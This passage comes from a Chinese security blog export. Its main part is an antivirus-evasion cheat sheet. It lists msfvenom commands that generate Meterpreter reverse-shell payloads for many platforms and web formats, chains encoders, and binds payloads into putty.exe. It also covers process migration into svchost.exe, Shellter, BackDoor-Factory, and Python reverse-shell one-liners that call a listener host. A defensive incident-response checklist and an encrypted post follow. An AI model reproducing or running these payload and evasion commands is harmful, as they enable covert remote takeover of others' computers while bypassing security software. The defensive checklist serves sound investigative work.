指定创建好的payload的存放位置</span><br><span class="line">-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式</span><br><span class="line">–shellest 最小化生成payload</span><br><span class="line">-h, –help 查看帮助选项</span><br><span class="line">–help-formats 查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

<h3 id="监听参数"><a href="#监听参数" class="headerlink" title="监听参数"></a>监听参数</h3><h4 id="防止假死与假session"><a href="#防止假死与假session" class="headerlink" title="防止假死与假session"></a>防止假死与假session</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span>   //可以在接收到seesion后继续监听端口，保持侦听。</span><br></pre></td></tr></table></figure>

<h4 id="防止session意外退出"><a href="#防止session意外退出" class="headerlink" title="防止session意外退出"></a>防止session意外退出</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> SessionCommunicationTimeout 0  //默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> SessionExpirationTimeout 0 //默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭</span><br></pre></td></tr></table></figure>

<h4 id="handler后台持续监听"><a href="#handler后台持续监听" class="headerlink" title="handler后台持续监听"></a>handler后台持续监听</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit -j -z</span><br></pre></td></tr></table></figure>

<h4 id="payload的可持续化"><a href="#payload的可持续化" class="headerlink" title="payload的可持续化"></a>payload的可持续化</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b <span class="string">&quot;\x00&quot;</span> -i 5 -a x86 --platform win PrependMigrate=<span class="literal">true</span> PrependMigrateProc=svchost.exe -f exe -o  shell.exe</span><br></pre></td></tr></table></figure>

<p>PrependMigrate&#x3D;true PrependMigrateProc&#x3D;svchost.exe 使这个程序默认会迁移到svchost.exe进程</p>
<h4 id="绕过杀软"><a href="#绕过杀软" class="headerlink" title="绕过杀软"></a>绕过杀软</h4><p>使用reverse_https等payload时可以使用下列方法bypass部分杀软</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> EnableStageEncoding <span class="literal">true</span>   //尝试使用不同的编码器对stage进行编码，可能绕过部分杀软的查杀</span><br><span class="line">EnableStageEncoding =&gt; <span class="literal">true</span></span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> stageencoder x86/fnstenv_mov</span><br><span class="line">Stageencoder =&gt; x64/xor</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> stageencodingfallback <span class="literal">false</span></span><br><span class="line">stageencodingfallback =&gt; <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>使用reverse_tcp_rc4也有同样的效果，而且不能设置stageencoder选项，更稳定更方便</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp_rc4  lhost=10.211.55.2 lport=3333 RC4PASSWORD=tidesec  -f c</span><br></pre></td></tr></table></figure>

<h3 id="各平台payload生成"><a href="#各平台payload生成" class="headerlink" title="各平台payload生成"></a>各平台payload生成</h3><h4 id="window"><a href="#window" class="headerlink" title="window"></a>window</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform osx -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

<h4 id="android"><a href="#android" class="headerlink" title="android"></a>android</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.apk</span><br><span class="line"></span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 R &gt; test.apk</span><br></pre></td></tr></table></figure>

<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1</span><br></pre></td></tr></table></figure>

<h4 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h4><p>正向连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_hidden_bind_tcp LHOST=10.211.55.2 LPORT=3333  -f exe&gt; 1.exe</span><br></pre></td></tr></table></figure>

<p>反向连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333  -f exe&gt; 1.exe</span><br></pre></td></tr></table></figure>

<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><h4 id="lunix"><a href="#lunix" class="headerlink" title="lunix"></a>lunix</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f c</span><br></pre></td></tr></table></figure>

<h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f c</span><br></pre></td></tr></table></figure>

<h4 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform osx -f c</span><br></pre></td></tr></table></figure>

<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><h4 id="Python反弹shell"><a href="#Python反弹shell" class="headerlink" title="Python反弹shell"></a>Python反弹shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<h4 id="Python正向shell"><a href="#Python正向shell" class="headerlink" title="Python正向shell"></a>Python正向shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">python/python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.211.55.2&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line">python/python3 -c <span class="string">&quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&quot;</span>10.211.55.2<span class="string">&quot;,3333))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

<h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

<h4 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_lua LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.lua</span><br></pre></td></tr></table></figure>

<h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.rb</span><br></pre></td></tr></table></figure>

<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>

<h4 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f aspx -o shell.aspx</span><br></pre></td></tr></table></figure>

<h4 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<h4 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<h4 id="war"><a href="#war" class="headerlink" title="war"></a>war</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<h4 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.js</span><br></pre></td></tr></table></figure>

<h3 id="Handlers"><a href="#Handlers" class="headerlink" title="Handlers"></a>Handlers</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD &lt;Payload name&gt;</span><br><span class="line"><span class="built_in">set</span> LHOST 10.211.55.2</span><br><span class="line"><span class="built_in">set</span> LPORT 3333</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>

<h3 id="自编码处理"><a href="#自编码处理" class="headerlink" title="自编码处理"></a>自编码处理</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom --list encoders //所有编码方式</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b <span class="string">&quot;\x00&quot;</span> -i 15 -f</span><br><span class="line">exe -o payload2.exe //使用x86/shikata_ga_nai对payload进行编码</span><br></pre></td></tr></table></figure>

<h3 id="自捆绑免杀"><a href="#自捆绑免杀" class="headerlink" title="自捆绑免杀"></a>自捆绑免杀</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -x putty.exe -f exe -o payload3.exe //将payload与putty.exe捆绑在一起</span><br></pre></td></tr></table></figure>

<h3 id="自捆绑-编码"><a href="#自捆绑-编码" class="headerlink" title="自捆绑+编码"></a>自捆绑+编码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -x putty.exe -i 15 -</span><br><span class="line">f exe -o payload4.exe</span><br></pre></td></tr></table></figure>

<h3 id="多重编码"><a href="#多重编码" class="headerlink" title="多重编码"></a>多重编码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=10.211.55.2 LPORT=3333 -f raw |</span><br><span class="line">msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o payload5.exe</span><br></pre></td></tr></table></figure>

<p>shikata_ga_nai编码20次，alpha_upper编码10次，countdown编码10次</p>
<h2 id="msf-evasion"><a href="#msf-evasion" class="headerlink" title="msf evasion"></a>msf evasion</h2><h3 id="生成exe"><a href="#生成exe" class="headerlink" title="生成exe"></a>生成exe</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show evasion(查看evasion的模块)</span><br><span class="line">use windows/windows_defender_exe</span><br><span class="line"><span class="built_in">set</span> filename payload.exe</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST</span><br><span class="line"><span class="built_in">set</span> LPORT</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h2 id="Shellter"><a href="#Shellter" class="headerlink" title="Shellter"></a>Shellter</h2><p>kali</p>
<p>shellter &#x2F;&#x2F;进入shellter</p>
<p><img src="/2022/05/11/%E5%85%8D%E6%9D%80-%E5%B7%A5%E5%85%B7%E7%AF%87/1.png" alt="img"></p>
<p>选择模式Auto<br>输入我们要捆绑的软件</p>
<p><img src="/2022/05/11/%E5%85%8D%E6%9D%80-%E5%B7%A5%E5%85%B7%E7%AF%87/2.png" alt="img"></p>
<p>隐匿模式会影响免杀效果<br>payload选择windows&#x2F;reverse_tcp</p>
<p><img src="/2022/05/11/%E5%85%8D%E6%9D%80-%E5%B7%A5%E5%85%B7%E7%AF%87/3.jpg" alt="img"></p>
<h2 id="BackDoor-Factory"><a href="#BackDoor-Factory" class="headerlink" title="BackDoor-Factory"></a>BackDoor-Factory</h2><p>检测exe是否符合条件:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">backdoor-factory -f exe路径 -S</span><br></pre></td></tr></table></figure>

<p>加载自定义shellcode<br>shellcode为raw格式</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">backdoor-factory -f exe路径 -s</span><br><span class="line">user_supplied_shellcode_threaded -U shellcode路径 -o</span><br><span class="line">payload.exe</span><br></pre></td></tr></table></figure>

<p>参考来源:<a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>入侵检测排查</title>
    <url>/2022/07/11/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E6%8E%92%E6%9F%A5/</url>
    <content><![CDATA[<h2 id="病毒检测"><a href="#病毒检测" class="headerlink" title="病毒检测"></a>病毒检测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://s.threatbook.cn/</span><br><span class="line">https://www.virustotal.com/gui/home/upload</span><br></pre></td></tr></table></figure>

<h2 id="IP溯源"><a href="#IP溯源" class="headerlink" title="IP溯源"></a>IP溯源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://x.threatbook.com/</span><br></pre></td></tr></table></figure>

<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -anop</span><br></pre></td></tr></table></figure>

<p>查看监听，是否存在异常监听端口<br>定位可疑的ESTABLISHED（ESTABLISHED表示TCP连接成功）</p>
<h3 id="异常进程"><a href="#异常进程" class="headerlink" title="异常进程"></a>异常进程</h3><p>进程排查工具：<br><a href="https://processhacker.sourceforge.io/">process hacker</a><br>重点排查进程：</p>
<ol>
<li>网络连接中可疑ESTABLISHED的PID进程</li>
<li>svchost.exe</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- 判断文件目录地址是否存在于%systemroot%\System32</span><br><span class="line">- tasklist/svc命令查看svchost.exe右边的服务是否‘暂缺’</span><br><span class="line">- 是否有调用可疑动态链接库（右键-属性 查看command line）</span><br></pre></td></tr></table></figure>

<h3 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h3><ol>
<li><p>排查最近访问文件：%UserProfile%\Recent，查看是否存在危险文件，分析功能即可</p>
</li>
<li><p>对WWW中存在的webshell位置进行排查（D盾）</p>
</li>
</ol>
<h3 id="后门文件"><a href="#后门文件" class="headerlink" title="后门文件"></a>后门文件</h3><p>对可疑文件进行分析：</p>
<ol>
<li>创建时间</li>
<li>位置</li>
<li>是否存在外连行为</li>
<li>执行内容</li>
</ol>
<h3 id="后门账号"><a href="#后门账号" class="headerlink" title="后门账号"></a>后门账号</h3><p>使用<a href="https://www.d99net.net/">D盾</a>查看是否存在克隆账号</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user // 查看系统账户</span><br><span class="line"><span class="built_in">net</span> user username // 查看用户具体信息</span><br></pre></td></tr></table></figure>

<p>注册表排查<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList<br>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names<br>是否存在隐藏用户</p>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>计划任务排查工具：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">autoruns</a></p>
<p>分析计划任务所执行的内容</p>
<h3 id="自启动项"><a href="#自启动项" class="headerlink" title="自启动项"></a>自启动项</h3><p>自启动项排查工具：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">autoruns</a><br>分析自启动项所执行的内容</p>
<h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><h4 id="排查web日志"><a href="#排查web日志" class="headerlink" title="排查web日志"></a>排查web日志</h4><p>web日志排查工具：<a href="https://www.apacheviewer.com/">http_log_view</a> 360星图<br>根据webshell上传事件去检索日志，对攻击者的ip进行溯源</p>
<h4 id="排查mysql日志"><a href="#排查mysql日志" class="headerlink" title="排查mysql日志"></a>排查mysql日志</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;log_%&#x27;; </span><br></pre></td></tr></table></figure>

<h4 id="排查系统登录日志"><a href="#排查系统登录日志" class="headerlink" title="排查系统登录日志"></a>排查系统登录日志</h4><ul>
<li>事件查看器-Windows日志-安全</li>
<li>事件ID：4624-系统登录成功</li>
<li>登录类型：10-远程交互</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>排查浏览器的下载记录</li>
<li>排查其他用户的桌面或文件夹中是否存在可疑文件</li>
</ol>
<h3 id="webshell排查"><a href="#webshell排查" class="headerlink" title="webshell排查"></a>webshell排查</h3><p>webshell排查工具：<a href="https://www.d99net.net/">D盾</a></p>
<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="网络连接-1"><a href="#网络连接-1" class="headerlink" title="网络连接"></a>网络连接</h3><p>对内: 敏感服务&#x2F;端口：22，445，3389。(stat&#x3D;SYN?)<br>对外：非常规服务端口，高端口，云主机IP等等</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -anp(显示全部网络连接)</span><br><span class="line">netstat -tlnp(TCP监听)</span><br><span class="line">netstat -tnp(TCP连接)</span><br><span class="line">netstat -unp(UDP连接)</span><br><span class="line">netstat -tnp -c <span class="number">1</span>|grep SYN/<span class="built_in">TIME</span>/ESTAB(以<span class="number">1</span>s的频率执行netstat)</span><br><span class="line">lsof -i(显示全部网络连接，可以观察到对应的进程与用户)</span><br></pre></td></tr></table></figure>

<h3 id="异常进程-1"><a href="#异常进程-1" class="headerlink" title="异常进程"></a>异常进程</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ps -ef/-<span class="built_in">aux</span> //二者的输出结果大致相同，风格不同，<span class="built_in">aux</span>会截断command，ef不会</span><br></pre></td></tr></table></figure>

<p>关注内容：</p>
<ul>
<li>进程特征：参数、路径、名称、资源占用</li>
<li>操作特征：网络特征、行为特征(CMD)</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">top //查看资源占用</span><br></pre></td></tr></table></figure>

<h3 id="敏感目录-1"><a href="#敏感目录-1" class="headerlink" title="敏感目录"></a>敏感目录</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ls -a</span><br></pre></td></tr></table></figure>

<ul>
<li>&#x2F;tmp</li>
<li>&#x2F;var&#x2F;tmp</li>
<li>&#x2F;dev&#x2F;shm</li>
</ul>
<h3 id="后门文件-1"><a href="#后门文件-1" class="headerlink" title="后门文件"></a>后门文件</h3><h4 id="ssh后门"><a href="#ssh后门" class="headerlink" title="ssh后门"></a>ssh后门</h4><p>查看进程</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -antp|grep -E &quot;chfn|su|chsh&quot; //找到异常端口及进程</span><br></pre></td></tr></table></figure>

<p>定位文件</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ps -<span class="built_in">aux</span>|grep 进程号 //通过进程找异常文件</span><br></pre></td></tr></table></figure>

<p>删除文件</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">rm –f 文件<span class="built_in">path</span></span><br></pre></td></tr></table></figure>

<h3 id="后门账号-1"><a href="#后门账号-1" class="headerlink" title="后门账号"></a>后门账号</h3><h4 id="账号后门"><a href="#账号后门" class="headerlink" title="账号后门"></a>账号后门</h4><p>cat &#x2F;etc&#x2F;passwd<br>cat &#x2F;etc&#x2F;shadow<br>stat &#x2F;etc&#x2F;passwd<br>stat &#x2F;etc&#x2F;shadown<br>awk -F: ‘{if($3&#x3D;&#x3D;0)print $1}’ &#x2F;etc&#x2F;passwd &#x2F;&#x2F;打印root权限的user</p>
<h4 id="密钥后门"><a href="#密钥后门" class="headerlink" title="密钥后门"></a>密钥后门</h4><p>cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config | grep  PubkeyAuthentication &#x2F;&#x2F;是否为yes<br>&#x2F;root&#x2F;.ssh&#x2F;authorized_keys &#x2F;&#x2F;查看是否被修改</p>
<h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3><p>&#x2F;var&#x2F;log&#x2F;cron &#x2F;&#x2F;计划任务日志</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">grep &quot;CROND&quot; cron //查看历史执行记录</span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> $(cut -f1 -d: /etc/passwd); <span class="keyword">do</span> <span class="built_in">echo</span> $user; crontab -u $user -l; done //查看所有用户的计划任务 </span><br><span class="line">cat /etc/crontab //查看系统任务表</span><br><span class="line">cat /etc/cron.d/*</span><br><span class="line">cat /etc/cron.daily/*</span><br><span class="line">cat /etc/cron.weekly/*</span><br><span class="line">cat /etc/cron.monthly/*</span><br></pre></td></tr></table></figure>

<h3 id="自启动项-1"><a href="#自启动项-1" class="headerlink" title="自启动项"></a>自启动项</h3><p>重点目录：<br>&#x2F;etc&#x2F;profile.d<br>&#x2F;etc&#x2F;init.d<br>&#x2F;etc&#x2F;rc.d&#x2F;init.d<br>&#x2F;etc&#x2F;rc*.d<br>重点文件：<br>&#x2F;etc&#x2F;pfofile<br>&#x2F;etc&#x2F;bashrc<br>~&#x2F;.bash_profile<br>~&#x2F;.profile<br>~&#x2F;.bash_login<br>~&#x2F;.bash_logout</p>
<h3 id="日志-1"><a href="#日志-1" class="headerlink" title="日志"></a>日志</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">stat filename;</span><br><span class="line">ls -lu;ls -l;ls -lc;</span><br></pre></td></tr></table></figure>

<p>Access Time 访问时间-读取文件内容（cat&#x2F;more）<br>Modify Time 修改时间-修改文件内容（vim&#x2F;&gt;&#x2F;&gt;&gt;&#x2F;ls -l）默认只有root能修改日志<br>Change Time 状态时间-修改文件内容&#x2F;属性(chmod&#x2F;chown)</p>
<h4 id="登录日志"><a href="#登录日志" class="headerlink" title="登录日志"></a>登录日志</h4><p>重点排查文件<br>&#x2F;var&#x2F;log&#x2F;secure &#x2F;&#x2F;记录用户验证、授权等信息</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">grep &quot;Accepted&quot; /var/log/secure //登录成功</span><br><span class="line">grep &quot;Failed&quot; /var/log/secure //登录失败</span><br><span class="line">grep &quot;useradd&quot; /var/log/secure //添加用户</span><br><span class="line">grep &quot;userdel&quot; /var/log/secure //删除用户</span><br></pre></td></tr></table></figure>

<p>&#x2F;var&#x2F;log&#x2F;lastlog &#x2F;&#x2F;记录最近成功登录的事件<br>&#x2F;var&#x2F;log&#x2F;btmp &#x2F;&#x2F;记录所有登录失败的记录<br>&#x2F;var&#x2F;log&#x2F;wtmp &#x2F;&#x2F;记录每个用户登录、注销及系统的启动、停机的事件<br>&#x2F;var&#x2F;run&#x2F;utmp &#x2F;&#x2F;记录每个用户的信息</p>
<h4 id="操作日志"><a href="#操作日志" class="headerlink" title="操作日志"></a>操作日志</h4><p>~&#x2F;.bash_history &#x2F;&#x2F;bash历史记录<br>~&#x2F;.viminfo &#x2F;&#x2F;vim操作历史记录<br>~&#x2F;.ssh&#x2F;known_hosts &#x2F;&#x2F;ssh连接记录记录</p>
<h4 id="web日志-x2F-应用日志"><a href="#web日志-x2F-应用日志" class="headerlink" title="web日志&#x2F;应用日志"></a>web日志&#x2F;应用日志</h4><p>&#x2F;var&#x2F;log&#x2F;nginx<br>&#x2F;var&#x2F;log&#x2F;httpd<br>&#x2F;user-projects&#x2F;<domain_name>&#x2F;servers&#x2F;<server_name>&#x2F;logs&#x2F;access.log</server_name></domain_name></p>
<h3 id="webshell排查-1"><a href="#webshell排查-1" class="headerlink" title="webshell排查"></a>webshell排查</h3><p>工具：<a href="https://www.shellpub.com/">河马</a></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>入侵检测</tag>
      </tags>
  </entry>
  <entry>
    <title>常用代码汇总（施工中。。。）</title>
    <url>/2022/04/22/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="a9a8804e2619fc985a759a6fe4f98947a4a4fb242fe2cdd736cb4f30b44fbfb8">bd25ed9264b080267271e137e33d0ce1adc3c6b2bac6ceb0572e33f68e974c7905c6aaefbc98d1b1c7b751a6e56f7abcb20b71ddde29c6bf2e78acf32d3d80c3f27d3dd3452272eb3192913e5dbda96b21e65c508fb3cfe2331691314b42653807e5f4b561924c8873fd9d616a5806abb835d73b3ebfe290611aee7e84df57eb0732acc85206be77a2a4a466bbff155a93beca7f88cb62657598ff81f3979a182baf965be77343cb0b75cfc75e415f0ecb6c2799d1a19e8239c1ef87b833832b3e444b23ef7e909ecfcdbb30344781fd1ed499a09a37538ca6b2c876ea3d69dce484ba310a1c962a384e51e657ae5d462e1bccca86de7ce70098e238dab47610b45926f092d7caa09acc2c03f88a2044947b2185d0b504be7cde12f2f854625f4c7577ff4edefff5c289f569759223e22e5ec2861427cdf7bfbb5154a68a806f34d8f645625a2b919b362656ea051b8f9db5bfabe97930a0e6fdd0640658d4cfbd358fb1571ddfa0307ea4edc34aa81d4d2ee969762cee3c3184ec4ceae74e9dfc4e2a4e5ff8cc5b5a9c031672e8a473a6fc3dcf5efdad5478d612e20518d77bc49b3db5d14c637ebddf8fee7fa9b6a859d78ae69dbb79867d7c6896f152fbb0a6dd61f67c9d0afb7401f95a31cc4ffdaf1417abd83fb00b29d45645e8a03c2a5b665b984e5ecbad270c48bed1c46391b17346cdfe0981cda37983ea934696c5a7df5536c48cfc76b8176c5fb6ccbc17300a974e51c05df45d3c78921c58842c4eca54f4bd11bc9fcc9040e59f5c34dce680ac1fa85884d4c42ee1131cd939542c343e9843999d095dfeedb5c76cb6bfdd960c14d7d6fedebb9e1091c70951aec7fe6618e73b3f